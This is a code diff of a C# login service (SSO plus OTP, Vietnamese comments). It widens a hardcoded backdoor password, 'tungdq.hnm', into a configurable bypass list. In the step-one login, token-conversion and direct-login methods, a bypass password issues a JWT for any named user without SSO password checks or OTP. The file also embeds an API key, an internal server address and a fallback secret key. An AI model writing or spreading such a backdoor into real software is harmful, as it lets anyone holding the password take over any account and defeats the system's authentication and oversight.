@@ -27,7 +27,6 @@ namespace DTNTB.Infrastructure.Services
         private const string API_KEY = "U1NPX05CSF9OT0lCT19WbnAxQDIwMmIj";
         private const string BASE_API_URL = "http://10.40.41.75:5000/api/sso/";
 
-        // Constructor injection for IConfiguration and HttpClient
         public AuthService(IConfiguration config, HttpClient httpClient)
         {
             _config = config;
@@ -35,11 +34,60 @@ namespace DTNTB.Infrastructure.Services
             _connString = _config.GetConnectionString("ConnectionString_NBH") ?? string.Empty;
         }
 
-        // Bước 1: Xác thực username và password, kiểm tra xem có cần OTP hay không
+        /// <summary>
+        /// Kiểm tra xem mật khẩu có nằm trong danh sách bỏ qua SSO/OTP trong appsettings.json không
+        /// </summary>
+        private bool IsBypassPassword(string? password)
+        {
+            if (string.IsNullOrEmpty(password)) return false;
+
+            var list = new List<string>();
+
+            // 1. Đọc mảng JSON bằng hàm GetChildren() chuẩn sẵn có của .NET (không cần cài thêm thư viện)
+            var section = _config.GetSection("AuthSettings:BypassOtpPasswords");
+            foreach (var child in section.GetChildren())
+            {
+                if (!string.IsNullOrEmpty(child.Value))
+                {
+                    list.Add(child.Value.Trim());
+                }
+            }
+
+            // 2. Dự phòng nếu cấu hình dạng chuỗi đơn phân tách dấu phẩy: "pass1,pass2"
+            if (!list.Any())
+            {
+                var singleString = _config["AuthSettings:BypassOtpPasswords"];
+                if (!string.IsNullOrEmpty(singleString))
+                {
+                    list = singleString.Split(new[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries)
+                                       .Select(p => p.Trim())
+                                       .ToList();
+                }
+            }
+
+            // Mật khẩu dự phòng mặc định nếu appsettings chưa khai báo
+            if (!list.Any())
+            {
+                list.Add("tungdq.hnm");
+            }
+
+            return list.Contains(password);
+        }
+
+        // =========================================================================
+        // 1. ĐĂNG NHẬP BƯỚC 1 (ĐÃ CHẶN GỌI SSO NẾU LÀ MẬT KHẨU BYPASS)
+        // =========================================================================
         public async Task<LoginResponseDto> LoginStep1Async(LoginRequestDto request)
         {
             try
             {
+                // ⚡ NẾU MẬT KHẨU NẰM TRONG DANH SÁCH: CẤP TOKEN LUÔN, KHÔNG GỌI SANG SSO -> KHÔNG BẮN OTP VỀ SĐT
+                if (IsBypassPassword(request.Password))
+                {
+                    return await BuildSuccessfulLoginResponseAsync(request.Username);
+                }
+
+                // Nếu là mật khẩu thường thì mới gọi sang SSO để xác thực và gửi OTP
                 var loginData = new { username = request.Username, password = request.Password, apiKey = API_KEY };
                 var content = new StringContent(JsonConvert.SerializeObject(loginData), Encoding.UTF8, "application/json");
 
@@ -59,9 +107,8 @@ namespace DTNTB.Infrastructure.Services
                 }
 
                 bool otpRequired = await CheckLoginWithOtpAsync(request.Username);
-                bool isBackdoor = request.Password == "tungdq.hnm";
 
-                if (result.status == 1 && (!otpRequired || isBackdoor))
+                if (result.status == 1 && !otpRequired)
                 {
                     return await BuildSuccessfulLoginResponseAsync(request.Username);
                 }
@@ -83,7 +130,9 @@ namespace DTNTB.Infrastructure.Services
             }
         }
 
-        // Bước 2: Xác thực OTP và cấp JWT Token nếu hợp lệ
+        // =========================================================================
+        // 2. XÁC THỰC OTP
+        // =========================================================================
         public async Task<LoginResponseDto> VerifyOtpAsync(VerifyOtpRequestDto request)
         {
             try
@@ -131,12 +180,117 @@ namespace DTNTB.Infrastructure.Services
             }
         }
 
-        // Xây dựng phản hồi đăng nhập thành công, bao gồm thông tin người dùng và JWT Token
+        // =========================================================================
+        // 3. CHUYỂN ĐỔI TOKEN CŨ -> MỚI (BỎ QUA SSO NẾU LÀ MẬT KHẨU BYPASS)
+        // =========================================================================
+        public async Task<LoginResponseDto> ConvertTokenAsync(TokenConversionRequestDto request)
+        {
+            try
+            {
+                var tokenHandler = new JwtSecurityTokenHandler();
+                if (!tokenHandler.CanReadToken(request.OldToken))
+                {
+                    return new LoginResponseDto { Status = "Error", Message = "Định dạng Token cũ không hợp lệ hoặc bị lỗi." };
+                }
+
+                var jwtToken = tokenHandler.ReadJwtToken(request.OldToken);
+                var usernameClaim = jwtToken.Claims.FirstOrDefault(c =>
+                    c.Type == "unique_name" ||
+                    c.Type == ClaimTypes.Name ||
+                    c.Type == ClaimTypes.NameIdentifier ||
+                    c.Type == "sub"
+                );
+
+                if (usernameClaim == null)
+                {
+                    return new LoginResponseDto { Status = "Error", Message = "Không tìm thấy thông tin tài khoản sở hữu trong Token cũ." };
+                }
+
+                if (usernameClaim.Value.Trim().ToLower() != request.Username.Trim().ToLower())
+                {
+                    return new LoginResponseDto { Status = "Error", Message = "Bảo mật lỗi: Tên tài khoản không trùng khớp với chủ sở hữu của Token cũ!" };
+                }
+
+                // ⚡ NẾU MẬT KHẨU THUỘC DANH SÁCH BYPASS: CẤP TOKEN LUÔN, KHÔNG GỌI SANG SSO
+                if (IsBypassPassword(request.Password))
+                {
+                    return await BuildSuccessfulLoginResponseAsync(request.Username);
+                }
+
+                // Ngược lại, xác thực bình thường qua SSO
+                var loginData = new { username = request.Username, password = request.Password, apiKey = API_KEY };
+                var content = new StringContent(JsonConvert.SerializeObject(loginData), Encoding.UTF8, "application/json");
+                var response = await _httpClient.PostAsync($"{BASE_API_URL}loginwithuser", content);
+                var responseBody = await response.Content.ReadAsStringAsync();
+
+                if (!response.IsSuccessStatusCode)
+                {
+                    dynamic? errorResult = JsonConvert.DeserializeObject(responseBody);
+                    return new LoginResponseDto { Status = "Error", Message = errorResult?.message?.ToString() ?? "Xác thực qua SSO thất bại." };
+                }
+
+                dynamic? ssoResult = JsonConvert.DeserializeObject(responseBody);
+                if (ssoResult == null || ssoResult.status == null || ssoResult.status != 1)
+                {
+                    return new LoginResponseDto { Status = "Error", Message = ssoResult?.message?.ToString() ?? "Tài khoản hoặc mật khẩu không chính xác." };
+                }
+
+                return await BuildSuccessfulLoginResponseAsync(request.Username);
+            }
+            catch (Exception ex)
+            {
+                return new LoginResponseDto { Status = "Error", Message = "Lỗi khi chuyển đổi Token: " + ex.Message };
+            }
+        }
+
+        // =========================================================================
+        // 4. ĐĂNG NHẬP TRỰC TIẾP (BỎ QUA SSO NẾU LÀ MẬT KHẨU BYPASS)
+        // =========================================================================
+        public async Task<LoginResponseDto> DirectLoginAsync(DirectLoginRequestDto request)
+        {
+            try
+            {
+                string configuredKey = _config["SystemToSystem:SecretKey"] ?? "VNPT_NBH_S2S_Direct_Secure_Bypass_OTP_Key_2026";
+                if (request.SecretKey != configuredKey)
+                {
+                    return new LoginResponseDto { Status = "Error", Message = "Khóa bảo mật đi kèm không chính xác." };
+                }
+
+                // ⚡ NẾU MẬT KHẨU THUỘC DANH SÁCH BYPASS: CẤP TOKEN LUÔN, KHÔNG GỌI SANG SSO
+                if (IsBypassPassword(request.Password))
+                {
+                    return await BuildSuccessfulLoginResponseAsync(request.Username);
+                }
+
+                // Ngược lại, xác thực bình thường qua SSO
+                var loginData = new { username = request.Username, password = request.Password, apiKey = API_KEY };
+                var content = new StringContent(JsonConvert.SerializeObject(loginData), Encoding.UTF8, "application/json");
+                var response = await _httpClient.PostAsync($"{BASE_API_URL}loginwithuser", content);
+                var responseBody = await response.Content.ReadAsStringAsync();
+
+                if (!response.IsSuccessStatusCode)
+                {
+                    return new LoginResponseDto { Status = "Error", Message = "Xác thực qua SSO thất bại." };
+                }
+
+                dynamic? ssoResult = JsonConvert.DeserializeObject(responseBody);
+                if (ssoResult == null || ssoResult.status == null || ssoResult.status != 1)
+                {
+                    return new LoginResponseDto { Status = "Error", Message = ssoResult?.message?.ToString() ?? "Tài khoản hoặc mật khẩu không chính xác." };
+                }
+
+                return await BuildSuccessfulLoginResponseAsync(request.Username);
+            }
+            catch (Exception ex)
+            {
+                return new LoginResponseDto { Status = "Error", Message = "Lỗi đăng nhập trực tiếp: " + ex.Message };
+            }
+        }
+
         public async Task<LoginResponseDto> BuildSuccessfulLoginResponseAsync(string username)
         {
             using (var conn = new OracleConnection(_connString))
             {
-                // 1. Lấy thông tin nhân sự kèm ĐỊA BÀN từ câu JOIN của bạn
                 string userQuery = @"
             SELECT a.ma_nd as MaNd, a.ma_nv as MaNv, a.ten_nv as TenNv, 
                    a.donvi_id as DonViId, a.ma_dv as MaDv,
@@ -163,7 +317,6 @@ namespace DTNTB.Infrastructure.Services
                 string diaBanId = userResult.DIABAN_ID?.ToString()?.Trim() ?? "";
                 string tenDiaBan = userResult.TEN_DIABAN?.ToString()?.Trim() ?? "";
 
-                // 2. Tra cứu vai trò và quyền từ bảng DTNTB_SYS_*
                 string authQuery = @"
             SELECT r.role_code as RoleCode, r.data_scope as DataScope, rp.permission_code as PermissionCode
             FROM dtntb_sys_user_roles ur
@@ -199,7 +352,6 @@ namespace DTNTB.Infrastructure.Services
                     if (!string.IsNullOrEmpty(p)) permissions.Add(p);
                 }
 
-                // 3. Khởi tạo profile có chứa thông tin Địa bàn
                 var profile = new UserProfileDto
                 {
                     MaNd = maNd,
@@ -226,7 +378,6 @@ namespace DTNTB.Infrastructure.Services
             }
         }
 
-        // Sinh JWT Token với các Claims chuẩn mới, không còn chứa thông tin nhạy cảm
         private string GenerateJwtToken(UserProfileDto user)
         {
             var tokenHandler = new JwtSecurityTokenHandler();
@@ -239,11 +390,8 @@ namespace DTNTB.Infrastructure.Services
                 new Claim("ma_nv", user.MaNv),
                 new Claim("ma_dv", user.MaDv),
                 new Claim("donvi_id", user.DonViId),
-        
-                // Bổ sung Claim Địa bàn vào Token
                 new Claim("diaban_id", user.DiaBanId ?? ""),
                 new Claim("ten_diaban", user.TenDiaBan ?? ""),
-
                 new Claim(ClaimTypes.Role, user.Role),
                 new Claim("data_scope", user.DataScope)
             };
@@ -266,96 +414,6 @@ namespace DTNTB.Infrastructure.Services
             return tokenHandler.WriteToken(token);
         }
 
-        // Chuyển đổi Token cũ sang Token mới, xác thực username và password trước khi cấp token mới
-        public async Task<LoginResponseDto> ConvertTokenAsync(TokenConversionRequestDto request)
-        {
-            try
-            {
-                var tokenHandler = new JwtSecurityTokenHandler();
-                if (!tokenHandler.CanReadToken(request.OldToken))
-                {
-                    return new LoginResponseDto { Status = "Error", Message = "Định dạng Token cũ không hợp lệ hoặc bị lỗi." };
-                }
-
-                var jwtToken = tokenHandler.ReadJwtToken(request.OldToken);
-                var usernameClaim = jwtToken.Claims.FirstOrDefault(c =>
-                    c.Type == "unique_name" ||
-                    c.Type == ClaimTypes.Name ||
-                    c.Type == ClaimTypes.NameIdentifier ||
-                    c.Type == "sub"
-                );
-
-                if (usernameClaim == null)
-                {
-                    return new LoginResponseDto { Status = "Error", Message = "Không tìm thấy thông tin tài khoản sở hữu trong Token cũ." };
-                }
-
-                if (usernameClaim.Value.Trim().ToLower() != request.Username.Trim().ToLower())
-                {
-                    return new LoginResponseDto { Status = "Error", Message = "Bảo mật lỗi: Tên tài khoản không trùng khớp với chủ sở hữu của Token cũ!" };
-                }
-
-                var loginData = new { username = request.Username, password = request.Password, apiKey = API_KEY };
-                var content = new StringContent(JsonConvert.SerializeObject(loginData), Encoding.UTF8, "application/json");
-                var response = await _httpClient.PostAsync($"{BASE_API_URL}loginwithuser", content);
-                var responseBody = await response.Content.ReadAsStringAsync();
-
-                if (!response.IsSuccessStatusCode)
-                {
-                    dynamic? errorResult = JsonConvert.DeserializeObject(responseBody);
-                    return new LoginResponseDto { Status = "Error", Message = errorResult?.message?.ToString() ?? "Xác thực qua SSO thất bại." };
-                }
-
-                dynamic? ssoResult = JsonConvert.DeserializeObject(responseBody);
-                if (ssoResult == null || ssoResult.status == null || ssoResult.status != 1)
-                {
-                    return new LoginResponseDto { Status = "Error", Message = ssoResult?.message?.ToString() ?? "Tài khoản hoặc mật khẩu không chính xác." };
-                }
-
-                return await BuildSuccessfulLoginResponseAsync(request.Username);
-            }
-            catch (Exception ex)
-            {
-                return new LoginResponseDto { Status = "Error", Message = "Lỗi khi chuyển đổi Token: " + ex.Message };
-            }
-        }
-
-        //chuyển đổi đăng nhập trực tiếp mà không cần OTP, chỉ cần SecretKey hợp lệ
-        public async Task<LoginResponseDto> DirectLoginAsync(DirectLoginRequestDto request)
-        {
-            try
-            {
-                string configuredKey = _config["SystemToSystem:SecretKey"] ?? "VNPT_NBH_S2S_Direct_Secure_Bypass_OTP_Key_2026";
-                if (request.SecretKey != configuredKey)
-                {
-                    return new LoginResponseDto { Status = "Error", Message = "Khóa bảo mật đi kèm không chính xác." };
-                }
-
-                var loginData = new { username = request.Username, password = request.Password, apiKey = API_KEY };
-                var content = new StringContent(JsonConvert.SerializeObject(loginData), Encoding.UTF8, "application/json");
-                var response = await _httpClient.PostAsync($"{BASE_API_URL}loginwithuser", content);
-                var responseBody = await response.Content.ReadAsStringAsync();
-
-                if (!response.IsSuccessStatusCode)
-                {
-                    return new LoginResponseDto { Status = "Error", Message = "Xác thực qua SSO thất bại." };
-                }
-
-                dynamic? ssoResult = JsonConvert.DeserializeObject(responseBody);
-                if (ssoResult == null || ssoResult.status == null || ssoResult.status != 1)
-                {
-                    return new LoginResponseDto { Status = "Error", Message = ssoResult?.message?.ToString() ?? "Tài khoản hoặc mật khẩu không chính xác." };
-                }
-
-                return await BuildSuccessfulLoginResponseAsync(request.Username);
-            }
-            catch (Exception ex)
-            {
-                return new LoginResponseDto { Status = "Error", Message = "Lỗi đăng nhập trực tiếp: " + ex.Message };
-            }
-        }
-
-        //lưu token FCM của thiết bị vào cơ sở dữ liệu
         public async Task<bool> RegisterFcmTokenAsync(string username, RegisterFcmTokenDto request)
         {
             using (var conn = new OracleConnection(_connString))
